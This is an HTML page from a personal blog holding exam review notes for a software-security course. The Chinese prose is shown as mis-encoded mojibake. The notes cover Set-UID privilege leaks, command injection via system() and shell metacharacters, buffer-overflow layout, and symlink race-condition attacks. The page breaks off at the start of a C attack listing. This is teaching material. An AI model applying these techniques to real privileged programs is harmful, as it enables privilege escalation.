<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹  | çš“æœˆæ˜Ÿè¾°</title><meta name="author" content="æ‘˜æ˜Ÿçš„è¾‰"><meta name="copyright" content="æ‘˜æ˜Ÿçš„è¾‰"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Set-UIDç¨‹åºçŸ¥è¯†å†…å®¹æœ€å…³é”®çš„åœ°æ–¹ï¼šå¦‚æœæ™®é€šç”¨æˆ·ï¼ˆID &#x3D; 5000ï¼‰æ‰§è¡Œä¸€ä¸ª Set-UID ç¨‹åºï¼ŒçœŸå®ç”¨æˆ· ID ä»æ˜¯ 5000ï¼Œè€Œæœ‰æ•ˆç”¨æˆ· ID åˆ™å–å†³äºè¯¥ç¨‹åºçš„æ‰€æœ‰è€…ã€‚ç‰¹åˆ«åœ°ï¼Œå¦‚æœè¯¥ç¨‹åºçš„æ‰€æœ‰è€…æ˜¯ rootï¼Œé‚£ä¹ˆå…¶æœ‰æ•ˆç”¨æˆ· ID å°†ä¸º 0ã€‚è€Œè®¿é—®æ§åˆ¶ä¸­ä½¿ç”¨çš„æ˜¯æœ‰æ•ˆç”¨æˆ· IDï¼Œæ‰€ä»¥å°±å¯ä»¥æ»¡è¶³ï¼šæ™®é€šç”¨æˆ·å®è¡Œæ—¢å®šçš„ç‰¹æƒã€‚ æƒé™æ³„æ¼æœ¬è´¨ï¼šæ²¡æœ‰å…³é—­ä»¥rootèº«ä»½æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ Unix ä¸­">
<meta property="og:type" content="article">
<meta property="og:title" content="è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹ ">
<meta property="og:url" content="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/">
<meta property="og:site_name" content="çš“æœˆæ˜Ÿè¾°">
<meta property="og:description" content="Set-UIDç¨‹åºçŸ¥è¯†å†…å®¹æœ€å…³é”®çš„åœ°æ–¹ï¼šå¦‚æœæ™®é€šç”¨æˆ·ï¼ˆID &#x3D; 5000ï¼‰æ‰§è¡Œä¸€ä¸ª Set-UID ç¨‹åºï¼ŒçœŸå®ç”¨æˆ· ID ä»æ˜¯ 5000ï¼Œè€Œæœ‰æ•ˆç”¨æˆ· ID åˆ™å–å†³äºè¯¥ç¨‹åºçš„æ‰€æœ‰è€…ã€‚ç‰¹åˆ«åœ°ï¼Œå¦‚æœè¯¥ç¨‹åºçš„æ‰€æœ‰è€…æ˜¯ rootï¼Œé‚£ä¹ˆå…¶æœ‰æ•ˆç”¨æˆ· ID å°†ä¸º 0ã€‚è€Œè®¿é—®æ§åˆ¶ä¸­ä½¿ç”¨çš„æ˜¯æœ‰æ•ˆç”¨æˆ· IDï¼Œæ‰€ä»¥å°±å¯ä»¥æ»¡è¶³ï¼šæ™®é€šç”¨æˆ·å®è¡Œæ—¢å®šçš„ç‰¹æƒã€‚ æƒé™æ³„æ¼æœ¬è´¨ï¼šæ²¡æœ‰å…³é—­ä»¥rootèº«ä»½æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ Unix ä¸­">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://stellarhui.github.io/img/favicon.jpg">
<meta property="article:published_time" content="2025-12-20T15:27:16.423Z">
<meta property="article:modified_time" content="2025-12-23T11:46:28.416Z">
<meta property="article:author" content="æ‘˜æ˜Ÿçš„è¾‰">
<meta property="article:tag" content="ç§‘ç ”å·¥ä½œ,å­¦ä¹ ç¬”è®°,ä¸ªäººæˆé•¿">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://stellarhui.github.io/img/favicon.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹ ",
  "url": "https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/",
  "image": "https://stellarhui.github.io/img/favicon.jpg",
  "datePublished": "2025-12-20T15:27:16.423Z",
  "dateModified": "2025-12-23T11:46:28.416Z",
  "author": [
    {
      "@type": "Person",
      "name": "æ‘˜æ˜Ÿçš„è¾‰",
      "url": "https://stellarhui.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹ ',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/font.css"><meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/"><i class="fa-fw fas fa-book"></i><span> ZJUè¯¾ç¨‹</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-lightbulb"></i><span> æ ¸å¿ƒçŸ¥è¯†</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"><i class="fa-fw fas fa-microchip"></i><span> è®¡ç®—æœºä½“ç³»ç»“æ„</span></a></li><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><i class="fa-fw fas fa-network-wired"></i><span> è®¡ç®—æœºç½‘ç»œ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/%E6%95%B0%E5%AD%A6/"><i class="fa-fw fas fa-square-root-variable"></i><span> æ•°å­¦</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%9D%82%E9%A1%B9/"><i class="fa-fw fas fa-ellipsis"></i><span> æ‚é¡¹</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºæˆ‘</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">çš“æœˆæ˜Ÿè¾°</span></a><a class="nav-page-title" href="/"><span class="site-name">è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹ </span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/"><i class="fa-fw fas fa-book"></i><span> ZJUè¯¾ç¨‹</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-lightbulb"></i><span> æ ¸å¿ƒçŸ¥è¯†</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"><i class="fa-fw fas fa-microchip"></i><span> è®¡ç®—æœºä½“ç³»ç»“æ„</span></a></li><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><i class="fa-fw fas fa-network-wired"></i><span> è®¡ç®—æœºç½‘ç»œ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/%E6%95%B0%E5%AD%A6/"><i class="fa-fw fas fa-square-root-variable"></i><span> æ•°å­¦</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%9D%82%E9%A1%B9/"><i class="fa-fw fas fa-ellipsis"></i><span> æ‚é¡¹</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºæˆ‘</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">è½¯ä»¶å®‰å…¨åŸç†ä¸å®è·µï¼šæœŸæœ«å¤ä¹ </h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-12-20T15:27:16.423Z" title="å‘è¡¨äº 2025-12-20 23:27:16">2025-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-12-23T11:46:28.416Z" title="æ›´æ–°äº 2025-12-23 19:46:28">2025-12-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/">ZJUè¯¾ç¨‹</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">æ€»å­—æ•°:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>13åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Set-UIDç¨‹åº"><a href="#Set-UIDç¨‹åº" class="headerlink" title="Set-UIDç¨‹åº"></a>Set-UIDç¨‹åº</h2><h3 id="çŸ¥è¯†å†…å®¹"><a href="#çŸ¥è¯†å†…å®¹" class="headerlink" title="çŸ¥è¯†å†…å®¹"></a>çŸ¥è¯†å†…å®¹</h3><p>æœ€å…³é”®çš„åœ°æ–¹ï¼šå¦‚æœæ™®é€šç”¨æˆ·ï¼ˆID = 5000ï¼‰æ‰§è¡Œä¸€ä¸ª <strong>Set-UID ç¨‹åº</strong>ï¼Œ<strong>çœŸå®ç”¨æˆ· ID ä»æ˜¯ 5000ï¼Œè€Œæœ‰æ•ˆç”¨æˆ· ID åˆ™å–å†³äºè¯¥ç¨‹åºçš„æ‰€æœ‰è€…ã€‚<strong>ç‰¹åˆ«åœ°ï¼Œå¦‚æœè¯¥ç¨‹åºçš„æ‰€æœ‰è€…æ˜¯ rootï¼Œé‚£ä¹ˆå…¶æœ‰æ•ˆç”¨æˆ· ID å°†ä¸º 0ã€‚è€Œ</strong>è®¿é—®æ§åˆ¶</strong>ä¸­ä½¿ç”¨çš„æ˜¯æœ‰æ•ˆç”¨æˆ· IDï¼Œæ‰€ä»¥å°±å¯ä»¥æ»¡è¶³ï¼š<strong>æ™®é€šç”¨æˆ·å®è¡Œæ—¢å®šçš„ç‰¹æƒã€‚</strong></p>
<h4 id="æƒé™æ³„æ¼"><a href="#æƒé™æ³„æ¼" class="headerlink" title="æƒé™æ³„æ¼"></a>æƒé™æ³„æ¼</h4><p>æœ¬è´¨ï¼š<strong>æ²¡æœ‰å…³é—­ä»¥rootèº«ä»½æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦</strong>ã€‚åœ¨ Unix ä¸­ï¼Œæ–‡ä»¶æƒé™æ£€æŸ¥æ˜¯åœ¨æ‰“å¼€æ–‡ä»¶ï¼ˆopenï¼‰æ—¶è¿›è¡Œçš„ã€‚ä¸€æ—¦æ–‡ä»¶è¢«æ‰“å¼€å¾—åˆ°æ–‡ä»¶æè¿°ç¬¦ï¼ˆFile Descriptor, FDï¼‰ï¼Œåç»­çš„è¯»å†™æ“ä½œä¸å†æ£€æŸ¥æƒé™ï¼Œåªæ£€æŸ¥ FD æ˜¯å¦æœ‰æ•ˆã€‚</p>
<h4 id="è°ƒç”¨å‡½æ•°"><a href="#è°ƒç”¨å‡½æ•°" class="headerlink" title="è°ƒç”¨å‡½æ•°"></a>è°ƒç”¨å‡½æ•°</h4><p>ä¸€äº›å‡½æ•°è°ƒç”¨å¯èƒ½ä¼šäº§ç”Ÿé£é™©ï¼š</p>
<ul>
<li><code>system(command)</code> æ˜¯é€šè¿‡è°ƒç”¨ <code>"/bin/sh -c command"</code> å‘½ä»¤æ¥æ‰§è¡Œ <code>command</code> çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœè¾“å…¥ä¸­åŒ…å« shell å…ƒå­—ç¬¦ï¼ˆå¦‚ <code>;, |, &amp;&amp;, &gt;, $</code>ï¼‰ï¼Œä¼šå¯¼è‡´ <strong>å‘½ä»¤æ³¨å…¥ (Command Injection)</strong>ã€‚</li>
</ul>
<p>æ›´å®‰å…¨çš„ç‰ˆæœ¬ï¼š</p>
<ul>
<li><code>execve()</code> å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ï¼š(1) è¿è¡Œçš„æŒ‡ä»¤ï¼Œ(2) æŒ‡ä»¤æ‰€ç”¨åˆ°çš„å‚æ•°ï¼Œ(3) ä¼ å…¥æ–°ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚å®ƒç›´æ¥æ‰§è¡Œç¨‹åºï¼Œå¹¶å°†å‚æ•°ä½œä¸ºå­—ç¬¦ä¸²æ•°ç»„ä¼ é€’ï¼Œæ— é£é™©ã€‚</li>
</ul>
<h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><strong>é—®é¢˜</strong>ï¼šè¯•å›¾é€šè¿‡ä»¥ä¸‹å‘½ä»¤å°† prog å˜ä¸º root æ‹¥æœ‰çš„ Set-UID ç¨‹åºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chown</span> root prog</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 prog</span></span><br></pre></td></tr></table></figure>

<p>è¿™èƒ½è¾¾åˆ°ç›®çš„å—ï¼Ÿ</p>
<blockquote>
<p>ä¸èƒ½ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…ï¼ˆOwnerï¼‰è¢«æ”¹å˜æ—¶ï¼ˆä½¿ç”¨ chownï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼š<strong>è‡ªåŠ¨æ¸…é™¤</strong> Set-UID ä½ã€‚æ‰€ä»¥åº”å½“å…ˆ<code>sudo chmod 4755 prog</code>ï¼Œå†<code>sudo chown root prog</code>ã€‚</p>
</blockquote>
<h2 id="é€šè¿‡ç¯å¢ƒå˜é‡å®ç°æ”»å‡»"><a href="#é€šè¿‡ç¯å¢ƒå˜é‡å®ç°æ”»å‡»" class="headerlink" title="é€šè¿‡ç¯å¢ƒå˜é‡å®ç°æ”»å‡»"></a>é€šè¿‡ç¯å¢ƒå˜é‡å®ç°æ”»å‡»</h2><h2 id="ç¼“å†²åŒºæº¢å‡ºæ”»å‡»"><a href="#ç¼“å†²åŒºæº¢å‡ºæ”»å‡»" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºæ”»å‡»"></a>ç¼“å†²åŒºæº¢å‡ºæ”»å‡»</h2><h3 id="çŸ¥è¯†å†…å®¹-1"><a href="#çŸ¥è¯†å†…å®¹-1" class="headerlink" title="çŸ¥è¯†å†…å®¹"></a>çŸ¥è¯†å†…å®¹</h3><p><strong>å‡½æ•°æ ˆå¸§å¸ƒå±€å›¾</strong>ï¼š</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/function_stack_layout_chinese.png"></p>
<blockquote>
<p>ç¼“å†²åŒºæº¢å‡ºå›¾ç¤ºï¼š</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/buffer_overflow_chinese.png"></p>
</blockquote>
<p><strong>ç¨‹åºçš„å†…å­˜å¸ƒå±€</strong>ï¼š</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/mem_layout_chinese.png"></p>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li>æ•°æ®æ®µï¼ˆData segmentï¼‰ï¼šå­˜æ”¾<strong>ç”±ç¨‹åºå‘˜åˆå§‹åŒ–çš„é™æ€/å…¨å±€å˜é‡</strong>ã€‚ ä¾‹å¦‚ï¼Œ<code>static int a = 3</code> å®šä¹‰çš„å˜é‡<code>a</code>å°†ä¼šå­˜å‚¨åœ¨æ•°æ®æ®µä¸­ã€‚</li>
<li>BSSæ®µï¼ˆBSS segmentï¼‰ï¼šå­˜æ”¾<strong>æœªåˆå§‹åŒ–çš„é™æ€/å…¨å±€å˜é‡</strong>ã€‚æ“ä½œç³»ç»Ÿå°†ä¼š<strong>ç”¨0å¡«å……è¿™ä¸ªæ®µ</strong>ï¼Œ å› æ­¤æ‰€æœ‰æœªåˆå§‹åŒ–çš„å˜é‡éƒ½ä¼šè¢«åˆå§‹åŒ–ä¸º0ã€‚ä¾‹å¦‚ï¼Œ<code>static int b</code>æ‰€å®šä¹‰çš„é™æ€å˜é‡<code>b</code> å°†ä¿å­˜åœ¨BSSæ®µä¸­ï¼Œå¹¶ä¸”è¢«åˆå§‹åŒ–ä¸º0ã€‚</li>
</ul>
<h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><strong>é—®é¢˜ï¼š</strong> Buffer åœ¨ <code>0xAABB0010</code>ï¼ŒRetAddr åœ¨ <code>0xAABB0050</code>ã€‚æ„é€ æ”»å‡»å­—ç¬¦ä¸²ã€‚è¿”å›åœ°å€å­—æ®µèƒ½ä½¿ç”¨çš„æœ€å°å€¼æ˜¯å¤šå°‘ï¼Ÿ</p>
<blockquote>
<p>ï¼Ÿ</p>
</blockquote>
<p>ï¼ˆæ³¨ï¼šé‚£ä¸ªæŒ‡é’ˆlinkçš„é¢˜ç›®åº”è¯¥ä¸éœ€è¦æŒæ¡ï¼‰</p>
<h2 id="ç«æ€æ¡ä»¶æ”»å‡»"><a href="#ç«æ€æ¡ä»¶æ”»å‡»" class="headerlink" title="ç«æ€æ¡ä»¶æ”»å‡»"></a>ç«æ€æ¡ä»¶æ”»å‡»</h2><h3 id="çŸ¥è¯†å†…å®¹-2"><a href="#çŸ¥è¯†å†…å®¹-2" class="headerlink" title="çŸ¥è¯†å†…å®¹"></a>çŸ¥è¯†å†…å®¹</h3><h4 id="æ–‡ä»¶ç›¸å…³å‡½æ•°"><a href="#æ–‡ä»¶ç›¸å…³å‡½æ•°" class="headerlink" title="æ–‡ä»¶ç›¸å…³å‡½æ•°"></a>æ–‡ä»¶ç›¸å…³å‡½æ•°</h4><ul>
<li><p><code>access(path, mode)</code> çš„æ£€æŸ¥æœºåˆ¶ï¼š</p>
</li>
<li><p><code>open(path, flags)</code> çš„æ£€æŸ¥æœºåˆ¶ï¼š</p>
</li>
</ul>
<h4 id="ç²˜æ»-sticky-ç¬¦å·é“¾æ¥ä¿æŠ¤"><a href="#ç²˜æ»-sticky-ç¬¦å·é“¾æ¥ä¿æŠ¤" class="headerlink" title="ç²˜æ» (sticky) ç¬¦å·é“¾æ¥ä¿æŠ¤"></a>ç²˜æ» (sticky) ç¬¦å·é“¾æ¥ä¿æŠ¤</h4><p>å½“<code>fs.protected_symlinks=1</code>æ—¶ï¼Œ<strong>åœ¨å…¨å±€å¯å†™çš„ç²˜æ»ç›®å½•ä¸­</strong>ï¼Œç¬¦å·é“¾æ¥åªèƒ½åœ¨ä»¥ä¸‹æƒ…å†µè¢«è·Ÿéšï¼šï¼ˆ1ï¼‰<strong>ç¬¦å·é“¾æ¥æ‰€æœ‰è€… == å½“å‰è¿›ç¨‹eUID</strong> æˆ–ï¼ˆ2ï¼‰<strong>ç¬¦å·é“¾æ¥æ‰€æœ‰è€… == ç›®å½•æ‰€æœ‰è€…</strong></p>
<blockquote>
<p>ç¬¦å·é“¾æ¥â€œè·Ÿéšâ€æŒ‡çš„æ˜¯ï¼šå½“ç¨‹åºè®¿é—®ä¸€ä¸ªç¬¦å·é“¾æ¥æ—¶ï¼Œæ“ä½œç³»ç»Ÿ<strong>è§£æ</strong>è¯¥é“¾æ¥æŒ‡å‘çš„<strong>å®é™…ç›®æ ‡æ–‡ä»¶</strong>ï¼Œè€Œä¸æ˜¯æ“ä½œé“¾æ¥æ–‡ä»¶æœ¬èº«ã€‚</p>
</blockquote>
<p>è¿™å°±å®ç°äº†ä¿æŠ¤ï¼Œå› ä¸º**è·Ÿéšè€… (Follower / eUID)<strong>æ˜¯rootï¼Œè€Œ</strong>ç¬¦å·é“¾æ¥æ‰€æœ‰è€… (Symlink Owner)**æ˜¯attackerï¼ŒäºŒè€…ä¸ç›¸ç­‰ï¼Œå¯¼è‡´æ”»å‡»å¤±è´¥ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼š<code>access("/tmp/XYZ", O_RDWR)</code>ä½¿ç”¨<strong>real user id</strong>æ¥æ£€æŸ¥æƒé™ï¼</p>
</blockquote>
<h4 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h4><p>åŸºç¡€æ”»å‡»æ–¹æ³•ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span 